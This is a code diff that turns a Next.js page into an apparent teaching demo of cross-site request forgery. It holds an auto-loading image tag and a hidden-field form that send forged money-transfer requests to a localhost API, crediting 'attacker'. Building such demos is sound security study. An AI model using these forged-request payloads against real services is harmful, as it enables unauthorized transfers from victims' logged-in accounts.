@@ -1,8 +1,37 @@
+import React from 'react';
 
-export default function Home() {
+
+
+async function Page() {
     return (
-        <main className="flex min-h-screen flex-col items-center justify-between p-24">
-            {/*<AutomaticFetchRequestDeduping/>*/}
-        </main>
-    )
+        <div>
+
+            paste below code into different application . you will see cookies
+            <div>
+                <img
+                    src="http://localhost:3000/api/transfer?amount=1000&to=attacker"
+                    alt="csfr"
+                />
+
+                <form
+                    action="http://localhost:3000/api/transfer"
+                    method="GET"
+                >
+                    <input
+                        type="hidden"
+                        name="amount"
+                        value="5000"
+                    />
+                    <input
+                        type="hidden"
+                        name="to"
+                        value="attacker"
+                    />
+                    <button>Submit forged request</button>
+                </form>
+            </div>
+        </div>
+    );
 }
+
+export default Page;
